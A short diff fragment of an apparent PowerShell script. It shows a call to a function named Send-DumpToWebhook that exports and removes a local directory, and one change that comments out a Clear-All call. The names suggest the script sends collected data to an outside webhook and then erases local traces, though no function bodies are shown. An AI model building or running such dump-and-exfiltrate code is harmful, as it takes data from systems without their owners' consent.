@@ -538,6 +538,6 @@ Send-DumpToWebhook `
     -ExportDir $ExportDirDefault `
     -RemoveExportDir
 
-Clear-All
+#Clear-All
 
 
